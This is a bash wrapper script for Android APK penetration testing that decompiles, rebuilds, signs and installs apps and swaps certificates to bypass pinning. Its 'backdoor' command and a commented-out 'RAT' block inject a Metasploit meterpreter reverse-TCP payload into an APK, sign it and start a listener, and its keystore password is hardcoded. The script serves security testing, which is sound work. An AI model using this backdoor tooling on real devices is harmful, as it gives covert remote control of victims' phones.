#!/bin/bash
##
## This script is a wrapper for various tools used in analysis of APKs
## I built this to save time and brain power when doing mobile app tests
## for Android. The script is crude but works for me and if you wish to
## use it you are welcome to do so. I had no involvement in the dev of
## the tools currently used within this script only the wrapper itself.
##
## Below are some directives which control functionality of the script
## these are a work in progress!
##
## /m3m1t1m
##
##
##### DIRECTIVE FOR COLOUR CODING ######
COLOR="yes"
########################################
##### PASSWORD FOR KEYSTORE ############
# changing this will require deletion and
# recreation of appalyzer.keystore
KSP="pentest"
########################################
red () {
  if [ "$COLOR" == "yes" ];then
    echo -e '\033[1;31m'"$1"'\033[0m'
  else
    echo -e "$1"
  fi
}
yellow () {
  if [ "$COLOR" == "yes" ];then
    echo -e '\033[1;33m'"$1"'\033[0m'
  else
    echo -e "$1"
  fi
}
get () {
  c=`awk "/##### $1/ {print FNR}" /opt/appalyzer/"$2"/appalyzer.txt`
  ((c++))
  e=""
  while [ "$e" == "" ];do
    line=`cat /opt/appalyzer/"$2"/appalyzer.txt | awk "NR == $c"`
    eline=`echo "$line" | head -c 1`
    if [ "$eline" == "#" ];then
      e="end"
    else
      echo "$line" | egrep --color "\b(dangerous)\b|$"
    fi
    ((c++))
  done
}

cwd=`pwd`
jd="/opt/jd-gui"
apk=""
layer="appalyzer"
if [ ! -d /opt/appalyzer ];then
  mkdir /opt/appalyzer
fi
if [ ! -d "$jd" ];then
  yellow "[#] Appears this is the first use"
  yellow "[#] Setting up environment and installing toolkits"
  echo
  #check internet connection
  if [ "$(ping -c 1 google.com 2>/dev/null | grep -iao 'bytes from')" == "bytes from" ];then
    cd /opt/ && git clone https://github.com/java-decompiler/jd-gui.git && cd jd-gui
    ./gradlew build
    echo 'alias jd-gui="java -jar /opt/jd-gui/build/libs/jd-gui-*.jar"' >> ~/.bash_aliases
    alias jd-gui="java -jar /opt/jd-gui/build/libs/jd-gui-*.jar"
    apt-get update
    apt-get install apktool
    cp perms.com /opt/appalyzer/
    echo "[#] Setup completed"
    sleep 3
    cd "$cwd"
    clear
  else
    yellow "[!] To setup the environment automatically internet connection is required"
    yellow "[!] If you wish to do this manually please install jd-gui into /opt/jd-gui/ directory"
    yellow "[!] Alternatively, if you do not wish to install jd-gui, just create the directory"
    yellow "[!] Doing so will cause the decompile function which uses jd-gui to error"
    exit
  fi
  echo
  yellow "Opening new terminal due to environment changes... "
  echo
  sleep 2
-#################  gnome-terminal -e "appalyzer" & disown ### THIS WILL BE RELEASE
  gnome-terminal -e "/bin/appalyzer" & disown
  exit
fi
echo "Author: m3m1t1m"
echo ""
echo ""
echo " ▄▄▄       ██▓███   ██▓███   ▄▄▄       ██▓   ▓██   ██▓▒███████▒▓█████  ██▀███  "
echo "▒████▄    ▓██░  ██▒▓██░  ██▒▒████▄    ▓██▒    ▒██  ██▒▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒"
echo "▒██  ▀█▄  ▓██░ ██▓▒▓██░ ██▓▒▒██  ▀█▄  ▒██░     ▒██ ██░░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒"
echo "░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██░     ░ ▐██▓░  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  "
echo " ▓█   ▓██▒▒██▒ ░  ░▒██▒ ░  ░ ▓█   ▓██▒░██████▒ ░ ██▒▓░▒███████▒░▒████▒░██▓ ▒██▒"
echo " ▒▒   ▓▒█░▒▓▒░ ░  ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░  ██▒▒▒ ░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░"
echo "  ▒   ▒▒ ░░▒ ░     ░▒ ░       ▒   ▒▒ ░░ ░ ▒  ░▓██ ░▒░ ░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░"
echo "  ░   ▒   ░░       ░░         ░   ▒     ░ ░   ▒ ▒ ░░  ░ ░ ░ ░ ░   ░     ░░   ░ "
echo "      ░  ░                        ░  ░    ░  ░░ ░       ░ ░       ░  ░   ░     "
echo "                                              ░ ░     ░                        "
echo ""
wd=`pwd`
while [ 1 -lt 2 ];do
  echo -n "$layer> "
  read -e cmds
  cmd=`echo "$cmds" | awk '{print $1}'`
  if [ "$cmd" == "load" ];then
    if [ "$apk" == "" ];then
      echo
      apk=`echo "$cmds" | awk '{print $2}'`
      if [ -e "$apk" ];then
        cwd="${apk:0:1}"
        if [ "$cwd" != "/" ];then
          apk="$wd""/""$apk"
        fi
        chk=`file "$apk" | grep -iao 'Zip'`
        chkj=`file "$apk" | grep -iao 'Java'`
        if [ "$chk" == "Zip" ] || [ "$chkj" == "Java" ];then
          apkb=`basename "$apk"`
          if [ -d /opt/appalyzer/"$apkb" ];then
            yellow "[!] Project directory /opt/appalyzer/$apkb already exists"
            yellow "[!] Using existing directory for project workspace"
            red "[!!] If this was not expected exit now to avoid loss of data"
            echo
            apk="$apkb"
            layer="$apk"
            # GET APK DETAILS
          else
            yellow "[#] Loading and processing $apkb"
            mkdir /opt/appalyzer/"$apkb" && cp "$apk" /opt/appalyzer/"$apkb"/
            mkdir /opt/appalyzer/"$apkb"/builds
            cd /opt/appalyzer/"$apkb"/ && mkdir raw && cp "$apkb" raw/
            apk="$apkb"
            layer="$apk"
            cd raw/ && mkdir .temp && cp "$apk" .temp/ && cd .temp && unzip "$apk" > /dev/null 2>&1
            cd ../ && apktool d -o source "$apk" > /dev/null 2>&1
            cd source
            nm=`grep -iaR "app_name\">" ./res/values/strings.xml | awk -F'>' '{print $2}' | awk -F'<' '{print $1}'`
            pkg=`grep -iao "package=[-\"\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'"' '{print $2}'`
            ver=`grep -iao "VersionName=[-\"\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'"' '{print $2}'`
            intb=`grep -iao "VersionCode=[-\"\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'"' '{print $2}'`
            perm=`grep -iao "android.permission.[_\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'.' '{print $3}'`
            ### PROCESS PERMISSIONS BY DANGER LEVEL
            for p in "$perm";do
	      grep -a "$p" /opt/appalyzer/perms.com >> /opt/appalyzer/"$apk"/perms.temp
            done
            recfile="/opt/appalyzer/$apk/appalyzer.txt"
            echo
            echo -e "##### BASIC\n" >> "$recfile"
  	    echo "app name:	$nm" >> "$recfile"
            echo "package name:   $pkg" >> "$recfile"
            echo "app version:    $ver" >> "$recfile"
            echo "internal build: $intb" >> "$recfile"
            echo -e "\n##### PERMISSIONS\n" >> "$recfile"
            cat /opt/appalyzer/"$apk"/perms.temp >> "$recfile"
	    rm /opt/appalyzer/"$apk"/perms.temp
            ### CHECK IF APK CONTAINS RAW CERTIFICATES
	    certs=`find ./ -regextype egrep -regex '.*\.(crt|der|p12)'`
            if [ "$certs" != "" ];then
              yellow "[#] At least one raw SSL certificate was found"
              yellow "[#] It / they may be used for certificate pinning"
              yellow "[#] Gathering information from certificates"
              echo -e "\n##### SSL CERTIFICATES\n" >> "$recfile"
              echo
              for c in "$certs";do
                echo "Certificate found: $c" >> "$recfile"
                cb=`basename "$c"`
                if [ ! -d /opt/appalyzer/"$apk"/certs ];then
                  mkdir /opt/appalyzer/"$apk"/certs
                fi
                if [ "$(grep -iao -m 1 'bundle' $c)" == "bundle" ] || [ "$(grep -iao -m 1 'bundle' $c)" == "Bundle" ];then
                  echo -e "[#] This may be a collection of SSL certificates\n" >> "$recfile"
                else
                  openssl x509 -in "$c" -inform der -text -noout > /opt/appalyzer/"$apk"/certs/"$cb".txt
                  grep "DNS" /opt/appalyzer/"$apk"/certs/"$cb".txt | awk -F':' '{print "Valid for: "$2}' >> "$recfile"
                  grep "Issuer:" /opt/appalyzer/"$apk"/certs/"$cb".txt | grep -o "O=.*" | awk -F'=' '{print $2}' | awk -F',' '{print "Issuer: "$1}' >> "$recfile"
                  echo "" >> "$recfile"
                fi
              done
            fi
            echo -e "\n##### END #####\n" >> "$recfile"
            echo
            cat "$recfile" | egrep --color "\b(dangerous)\b|$"
            yellow "\n[#] APK loaded successfully, HELP options updated\n"
            wd=`pwd`
            # GET APK DETAILS
          fi
        else
          yellow "\n[!] File does not appear to be an APK\n"
          apk=""
        fi
      else
        yellow "\n[!] Cannot find APK at path specified\n"
        apk=""
      fi
    else
      yellow "\n[!] Unload current APK first\n"
    fi
  fi
  ### DISPLAY REQUESTED PERMISSIONS FOR THE APP
  if [ "$cmd" == "permissions" ];then
    if [ "$apk" == "" ];then
      yellow "\n[!] No APK is currently loaded\n"
    else
      echo
      get "PERMISSIONS" "$apk"
      echo
    fi
  fi
  ### DISPLAY INFO
  if [ "$cmd" == "info" ];then
    if [ "$apk" == "" ];then
      yellow "[!] \nNo APK is currently loaded\n"
    else
      echo
      get "BASIC" "$apk"
      echo
    fi
  fi
  ### BACKDOOR APK FILE
  if [ "$cmd" == "backdoor" ];then
    echo
    echo -n "Which interface do you want to listen on? "
    read intf
    ip=`ifconfig "$intf" | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | grep -m 1 .`
    ### FIND FULL PATH OF APK FILE TO BACKDOOR
    if [ ! -d "/opt/appalyzer/$apk/backdoors" ];then
      mkdir /opt/appalyzer/"$apk"/backdoors
    fi
    msfvenom --platform android -x /opt/appalyzer/"$apk"/"$apk" -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT=4444 > /opt/appalyzer/"$apk"/backdoors/bkdr.apk
    echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $ip\nset LPORT 4444\nset exitonsession false\nexploit -j" > /opt/appalyzer/"$apk"/backdoors/msf.rc
    yellow "[#] Starting postgresql and setting up handler in new terminal"
    service postgresql start
    gnome-terminal -e "msfconsole -r /opt/appalyzer/$apk/backdoors/msf.rc" & disown
    yellow "[#] Signing APK file with self signed certificate"
    if [ ! -f /opt/appalyzer/appalyzer.keystore ];then
      echo -e "$KSP\n$KSP\n\n\n\n\n\n\nyes" | keytool -genkey -v -keystore /opt/appalyzer/appalyzer.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
    fi
    echo "$KSP" | jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /opt/appalyzer/appalyzer.keystore /opt/appalyzer/"$apk"/backdoors/bkdr.apk alias_name
    yellow "[#] Backdoor created and signed"
    yellow "[#] Backdoored APK can be installed using the command \033[1;31mbkdrinstall\033[0m"
    yellow "[#] The raw file can be found at /opt/appalyzer/$apk/backdoors/bkdr.apk"
  fi
  ### INSTALL BACKDOOR ON DEVICE
  if [ "$cmd" == "bkdrinstall" ];then
    dev=`adb devices | egrep -v -m1 '(List|\*)'`
    if [ "$dev" == "" ];then
      yellow "\n[!] Please attach test android device\n"
    else
      adb install /opt/appalyzer/"$apk"/backdoors/bkdr.apk
    fi
  fi
  ### INSTALL APK ON DEVICE
  if [ "$cmd" == "push" ] || [ "$cmd" == "install" ];then
    dev=`adb devices | egrep -v -m1 '(List|\*)'`
    if [ "$dev" == "" ];then
      yellow "\n[!] Please attach test android device\n"
    else
      adb install /opt/appalyzer/"$apk"/"$apk"
    fi
  fi
  ####### UNINSTALL APK FROM DEVICE
  if [ "$cmd" == "remove" ] || [ "$cmd" == "uninstall" ];then
    if [ "$apk" != "" ];then
      dev=`adb devices | egrep -v -m1 '(List|\*)'`
      pkg=`grep "package" /opt/appalyzer/"$apk"/appalyzer.txt | awk '{print $3}'`
      if [ "$dev" == "" ];then
        yellow "\n[!] Please attach test android device\n"
      else
        adb uninstall "$pkg"
      fi
    else
      yellow "[!] No APK is currently loaded"
    fi
  fi
  ####### SIMPLE BACKDOOR DEVICE NO LOADED APK ### NEEDS TESTING
  #if [ "$cmd" == "RAT" ];then
  #  dev=`adb devices | egrep -v -m1 '(List|\*)'`
  #  if [ "$dev" == "" ];then
  #    yellow "\n[!] Please attach android device\n"
  #  else
  #    if [ ! -d /opt/appalyzer/RAT ];then
  #      mkdir /opt/appalyzer/RAT
  #    fi
  #    echo
  #    echo -n "Which IP do you want to listen on? "
  #    read ip
  #    msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT=4444 > /opt/appalyzer/RAT/RAT.apk
  #    yellow "[#] RAT created, proceeding with install"
  #    adb install /opt/appalyzer/RAT/RAT.apk
  #    yellow "[#] RAT installed on device"
  #    yellow "[#] Starting up listener"
  #    echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $ip\nset LPORT 4444\nset exitonsession false\nexploit -j" > /opt/appalyzer/RAT/RAT.rc
  #    service postgresql start
  #    msfconsole -r /opt/appalyzer/RAT/RAT.rc & disown
  #    sleep 3
  #    yellow "[#] Attempting to execute RAT"
  #    adb shell am start -n com.metasploit.stage/com.metasploit.stage.MainActivity
  #  fi
  #fi
  ####### ATTEMPT TO BYPASS CERTIFICATE PINNING
  if [ "$cmd" == "bypass" ];then
    if [ "$apk" != "" ];then
      echo
      echo -e "What bypass method should be attempted?\n\n"
      echo "1) Replace certificate files in the APK source (no chance of this working if certificates arent included in APK)"
      echo -e "2) None, changed my mind\n"
      echo -n "> "
      read opt
      if [ "$opt" == "1" ];then
        echo
        echo -n "Please supply the location of the proxy SSL certificate in der format: "
        read -e der
        d=`file "$der" | grep -o "data"`
        if [ "$d" != "data" ];then
          yellow "\n[!] The certificate does not appear to be valid\n"
        else
          certs=`find /opt/appalyzer/"$apk"/raw/source/ -regextype egrep -regex '.*\.(crt|der|p12)'`
          for p in "$certs";do
            cp "$der" "$p"
          done
          yellow "\n[#] APK certifcates have been replaced"
          yellow "[#] Rebuild APK and install on the device to test"
          yellow "[#] Original certificates in /opt/appalyzer/$apk/certs/\n"
        fi
      fi
      if [ "$opt" == "2" ];then
        :
      fi
    else
      yellow "\n[!] No APK is currently loaded\n"
    fi
  fi
  ####### SMALI FUNCTIONS
  #
  #
  #
  #
  #
  ####### REBUILD APK FROM SOURCE DIRECTORY
  if [ "$cmd" == "rebuild" ];then
    if [ "$apk" != "" ];then
      yellow "[#] Rebuilding APK from the source directory"
      c=1
      if [ -f /opt/appalyzer/"$apk"/builds/build-"$c"-"$apk" ];then
        d=0
        while [ $d -eq 0 ];do
          if [ ! -f /opt/appalyzer/"$apk"/builds/build-"$c"-"$apk" ];then
            d=1
          else
            ((c++))
          fi
        done
      fi
      rm /opt/appalyzer/"$apk"/raw/.temp/build.log
      apktool b -o /opt/appalyzer/"$apk"/builds/build-"$c"-"$apk" /opt/appalyzer/"$apk"/raw/source/ 2> /opt/appalyzer/"$apk"/raw/.temp/build.log
      d=`grep -o "Exception" /opt/appalyzer/"$apk"/raw/.temp/build.log | awk 'NR==1'`
      if [ "$d" == "Exception" ];then
        red "[!] Exception encountered during build process, build failed"
      else
        yellow "[#] Newly build APK located at /opt/appalyzer/$apk/builds/build-$c-$apk"
      fi
    else
      yellow "[!] No APK is currently loaded"
    fi
  fi
  ####### SIGN APK (LOADED / UNLOADED)
  if [ "$cmd" == "sign" ];then
    if [ ! -f /opt/appalyzer/appalyzer.keystore ];then
      echo -e "$KSP\n$KSP\n\n\n\n\n\n\nyes" | keytool -genkey -v -keystore /opt/appalyzer/appalyzer.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
    fi
    if [ "$apk" == "" ];then
      echo -n "What apk would you like to sign? "
      read sign
      bsign=`basename "$sign"`
      cp "$sign" "/opt/appalyzer/resigned-$bsign"
      echo "$KSP" | jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /opt/appalyzer/appalyzer.keystore "/opt/appalyzer/resigned-$bsign" alias_name
      yellow "[#] APK signed successfully"
      yellow "[#] Newly signed apk created \033[1;31m/opt/appalyzer/resigned-$bsign\033[0m"
    else
      cp /opt/appalyzer/"$apk"/"$apk" /opt/appalyzer/"$apk"/resigned-"$apk"
      echo "$KSP" | jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /opt/appalyzer/appalyzer.keystore /opt/appalyzer/"$apk"/resigned-"$apk" alias_name
      yellow "[#] APK signed successfully"
      yellow "[#] Newly signed apk created \033[1;31m/opt/appalyzer/$apk/resigned-$apk\033[0m"
    fi
  fi
  ####### ADB SHELL
  if [ "$cmd" == "shell" ];then
    ## CHECK IF DEVICE IS CONNECTED
    dev=`adb devices | egrep -v -m1 '(List|\*)'`
    if [ "$dev" == "" ];then
      yellow "\n[!] Please attach test android device\n"
    else
      adb shell
    fi
  fi
  ### VIEW JAVA SOURCE CODE OF THE APP
  if [ "$cmd" == "decompile" ];then
    jc1="/opt/appalyzer/"
    jc2="/java/classes.jar"
    ### NEEDS MORE WORK FOR FULL DECOMPILATION
    if [ ! -f "$jc1"$apk"$jc2" ];then
      mkdir /opt/appalyzer/"$apk"/raw/java
      d2j-dex2jar /opt/appalyzer/"$apk"/raw/.temp/classes.dex -o /opt/appalyzer/"$apk"/java/classes.jar
      java -jar /opt/jd-gui/build/libs/jd-gui-*.jar /opt/appalyzer/"$apk"/java/classes.jar
    else
      java -jar /opt/jd-gui/build/libs/jd-gui-*.jar /opt/appalyzer/"$apk"/java/classes.jar
    fi
    ##########################################
  fi
  ### UNLOAD CURRENTLY LOADED APK FILE
  if [ "$cmd" == "unload" ];then
    if [ "$apk" == "" ];then
      echo "There isn't a loaded APK."
    else
      apk=""
      layer="appalyzer"
    fi
  fi
  ### LIST FILES LOCALLY
  if [ "$cmd" == "ls" ];then
    echo
    ls -la
    echo
  fi
  ### CHANGE DIR LOCALLY
  if [ "$cmd" == "cd" ];then
    dir=`echo "$cmds" | awk '{print $2}'`
    cd "$dir"
    wd=`pwd`
  fi
  ### EXIT APPALYZER
  if [ "$cmd" == "exit" ];then
    exit
  fi
  if [ "$cmd" == "quit" ];then
    exit
  fi
  if [ "$cmd" == "help" ];then
    if [ "$apk" = "" ];then ### NO APK IS LOADED
      echo -e "\n\033[1;33mload <apk file>\033[0m: loads apk for analysis\n\033[1;33mls\033[0m: list local files\n\033[1;33mcd\033[0m: change local directory"
      echo -e "\033[1;33mshell\033[0m: drops into adb shell (device must be connected first)\n\033[1;33msign\033[0m: resign an apk file after modification"
      echo -e "\033[1;33mhelp\033[0m: displays this screen\n\033[1;33mquit\033[0m: exit appalyzer\n\033[1;33mexit\033[0m: exit appalyzer\n"
    else ### lOADED APK
      echo -e "\n\033[1;33munload\033[0m: unloads apk from analysis framework\n\033[1;33mpermissions\033[0m: display permissions for loaded APK\n\033[1;33mdecompile\033[0m: decompiles apk into java source code"
      echo -e "\033[1;33mbackdoor\033[0m: backdoors currently loaded apk using meterpreter and starts a listener\n\033[1;33mpush\033[0m: installs currently loaded apk onto connected device"
      echo -e "\033[1;33mrebuild\033[0m: rebuilds the APK using the code in the source directory"
      echo -e "\033[1;33minfo\033[0m: displays apk information\n\033[1;33mls\033[0m: list local files\n\033[1;33mcd\033[0m: change local directory"
      echo -e "\033[1;33mshell\033[0m: drops into adb shell (device must be connected first)\n\033[1;33msign\033[0m: resign an apk file after modification"
      echo -e "\033[1;33mhelp\033[0m: displays this screen\n\033[1;33mquit\033[0m: exit appalyzer\n\033[1;33mexit\033[0m: exit appalyzer\n"
    fi
  fi
done
